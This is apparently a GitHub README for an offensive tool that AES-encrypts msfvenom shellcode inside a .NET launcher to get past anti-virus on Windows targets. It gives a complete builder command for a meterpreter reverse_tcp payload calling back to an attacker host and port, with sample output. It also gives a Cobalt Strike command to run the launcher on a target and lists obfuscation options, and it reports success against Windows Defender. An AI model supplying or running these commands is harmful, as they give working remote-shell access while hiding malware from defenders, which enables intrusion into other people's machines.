# ShellcodeEncryptor
A simple shell code encryptor/decryptor/executor to bypass anti virus.

<img src="https://raw.githubusercontent.com/plackyhacker/ShellcodeEncryptor/master/demo.gif" alt="Demo " style="zoom:150%;" />

# Purpose
To generate a .Net binary containing base64 encoded, AES encrypted shellcode that will execute on a Windows target, bypassing anti-virus.

# Instructions

Use the `builder.py` to create the executable (you will need `mono` installed on your Linux box):
```
root@kali:~# ./builder.py -p windows/meterpreter/reverse_tcp --lport 443 --lhost 192.168.1.109 -f msLauncher.exe --method delegate
[+] Generating MSFVENOM payload...
[+] Encrypting the payload, key=lejsIgzIhyTeEOTbxYzPs5nPKAnXW1qc...
[+] Generating launcher.cs file, method=delegate...
[+] Compiling the launcher...
[+] Launcher compiled and written to ./msLauncher.exe
[+] Have a nice day!
```

Take the resulting executable and run it on the target, for example (Cobalt Strike):
```
execute-assembly /root/msLauncher.exe
```

Hopefully you will have a nice meterpreter shell.

# Help

```
usage: builder.py [-h] [-l LPORT] [-i LHOST] [-p PAYLOAD] [-f FILENAME]
                  [-a ARCH] [-b] [-m METHOD] [-o]

optional arguments:
  -h, --help            show this help message and exit
  -l LPORT, --lport LPORT
                        The local port that msfconsole is listening on.
  -i LHOST, --lhost LHOST
                        The local host that msfconsole is listening on.
  -p PAYLOAD, --payload PAYLOAD
                        The payload to generate in msfvenom.
  -f FILENAME, --filename FILENAME
                        The filename of the launcher.
  -a ARCH, --arch ARCH  The target architecture (x64 or x86) for Mono.
  -b, --base64only      Output the base64 encrypted payload only.
  -m METHOD, --method METHOD
                        The method to use: thread/delegate.
  -o, --obfuscate       Obfuscate the csharp code.
  ```

# Notes

https://github.com/plackyhacker/ShellcodeEncryptor/blob/master/launcher.cs is provided as a reference.
Tested with x86 windows/meterpreter/reverse_tcp on Windows 10 with Defender.
